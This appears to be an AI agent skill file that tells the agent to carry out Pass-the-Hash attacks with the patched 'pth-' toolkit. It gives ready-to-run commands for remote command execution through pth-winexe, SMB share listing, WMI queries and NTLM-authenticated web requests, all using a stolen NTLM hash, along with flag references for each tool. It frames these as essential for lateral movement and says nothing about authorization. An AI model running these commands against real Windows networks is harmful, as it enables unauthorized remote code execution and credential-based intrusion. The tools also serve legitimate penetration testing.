---
name: passing-the-hash
description: Perform Pass-the-Hash (PtH) attacks using patched versions of common tools like Samba, Curl, WinEXE, and WMI. Use when you have obtained an NTLM hash and need to authenticate to Windows/Active Directory services without the plaintext password. This is essential for lateral movement, remote command execution, and service enumeration in Windows environments.
---

# passing-the-hash

## Overview
Passing-the-hash is a suite of patched tools (prefixed with `pth-`) that accept NTLM hashes as authentication input instead of plaintext passwords. It includes modified versions of Curl, FreeTDS, Samba, WinEXE, and WMI. Category: Password Attacks / Exploitation.

## Installation (if not already installed)
Assume the tools are installed. If missing:
```bash
sudo apt install passing-the-hash
```

## Common Workflows

### Remote Command Execution with pth-winexe
```bash
pth-winexe -U "ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:32ed87b1e111ed5002b433f0a73c963a" //192.168.1.100 cmd.exe
```

### List SMB Shares with pth-smbclient
```bash
pth-smbclient -L 192.168.1.100 -U "DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:32ed87b1e111ed5002b433f0a73c963a"
```

### WMI Query using Hash
```bash
pth-wmic -U "admin%hash" //host "select * from Win32_Process"
```

### Authenticated Web Request with pth-curl
```bash
pth-curl --ntlm -u "user%hash" http://internal-web-server/resource
```

## Complete Command Reference

### Shared Credential Syntax
For most `pth-` tools, the user format is: `[DOMAIN/]USERNAME%[LMHASH:]NTHASH`. If the LM hash is missing, use the empty LM hash placeholder: `aad3b435b51404eeaad3b435b51404ee`.

---

### pth-curl
Patched Curl for NTLM authentication via hashes.

| Flag | Description |
|------|-------------|
| `-d, --data <data>` | HTTP POST data |
| `-f, --fail` | Fail fast with no output on HTTP errors |
| `-h, --help <subject>` | Get help for commands/categories |
| `-o, --output <file>` | Write to file instead of stdout |
| `-O, --remote-name` | Write output to file named as remote file |
| `-i, --show-headers` | Show response headers in output |
| `-s, --silent` | Silent mode |
| `-T, --upload-file <file>` | Transfer local FILE to destination |
| `-u, --user <user:password>` | Server user and password (use `user%hash`) |
| `-A, --user-agent <name>` | Send User-Agent <name> to server |
| `-v, --verbose` | Make the operation more talkative |
| `-V, --version` | Show version number and quit |

---

### pth-winexe
Remote Windows command execution.

| Flag | Description |
|------|-------------|
| `--uninstall` | Uninstall winexe service after remote execution |
| `--reinstall` | Reinstall winexe service before remote execution |
| `--runas=[DOMAIN\]USER%PW` | Run as the given user (Warning: Cleartext over network) |
| `--runas-file=FILE` | Run as user options defined in a file |
| `--interactive=0\|1` | Desktop interaction (0: disallow, 1: allow). Requires `--system` |
| `--ostype=0\|1\|2` | OS type: 0 (32-bit), 1 (64-bit), 2 (auto) |
| `-U, --user=[DOM/]USER[%PW]` | Set network username/hash |
| `--pw-nt-hash` | The supplied password is the NT hash |
| `-N, --no-pass` | Don't ask for a password |
| `-A, --authentication-file=FILE` | Get credentials from a file |
| `-P, --machine-pass` | Use stored machine account password |
| `--use-kerberos=desired\|req\|off` | Use Kerberos authentication |

---

### pth-smbclient
FTP-like client to access SMB/CIFS resources.

| Flag | Description |
|------|-------------|
| `-L, --list=HOST` | Get a list of shares available on a host |
| `-I, --ip-address=IP` | Use this IP to connect to |
| `-U, --user=[DOM/]USER[%PW]` | Set network username/hash |
| `--pw-nt-hash` | The supplied password is the NT hash |
| `-c, --command=STRING` | Execute semicolon separated commands |
| `-p, --port=PORT` | Port to connect to |
| `-W, --workgroup=WORKGROUP` | Set the workgroup name |
| `-m, --max-protocol=LEVEL` | Set max protocol level (e.g., SMB3) |
| `-A, --authentication-file=FILE` | Get credentials from a file |

---

### pth-wmic / pth-wmis
WMI query and remote execution tools.

| Flag | Description |
|------|-------------|
| `--namespace=STRING` | WMI namespace (default: `root\cimv2`) |
| `--delimiter=STRING` | Delimiter for multiple values (default: `\|`) |
| `-U, --user=[DOM/]USER[%PW]` | Set network username/hash |
| `-A, --authentication-file=FILE` | Get credentials from a file |
| `-S, --signing=on\|off\|req` | Set the client signing state |
| `-k, --kerberos=STRING` | Use Kerberos |
| `-m, --maxprotocol=LEVEL` | Set max protocol level |

---

### pth-rpcclient
Tool for executing client-side MS-RPC functions.

| Flag | Description |
|------|-------------|
| `-c, --command=COMMANDS` | Execute semicolon separated cmds |
| `-I, --dest-ip=IP` | Specify destination IP address |
| `-p, --port=PORT` | Specify port number |
| `-U, --user=[DOM/]USER[%PW]` | Set network username/hash |
| `--pw-nt-hash` | The supplied password is the NT hash |

---

### pth-sqsh
Interactive database shell (FreeTDS/Sybase/MS SQL).

| Flag | Description |
|------|-------------|
| `-S, --server` | Name of server |
| `-U, --user` | Database username |
| `-P, --password` | Database password or hash |
| `-D, --database` | Change database context on startup |
| `-C, --cmd` | Send SQL statement to server |

---

### pth-net
Tool for administration of Samba and remote NT servers.

| Subcommand | Description |
|------------|-------------|
| `net -U user[%pw] setauthuser` | Set the auth user and password/hash |
| `net getauthuser` | Get current winbind auth user settings |
| `net rpc` | RPC commands (use `net help rpc` for details) |
| `net ads` | ADS commands (use `net help ads` for details) |
| `net sam` | SAM database commands |

## Notes
- If only the NTLM hash is available, use the LM hash placeholder: `aad3b435b51404eeaad3b435b51404ee`.
- Example full hash string: `aad3b435b51404eeaad3b435b51404ee:32ed87b1e111ed5002b433f0a73c963a`.
- These tools are essential when Kerberos is not available or when targeting local accounts.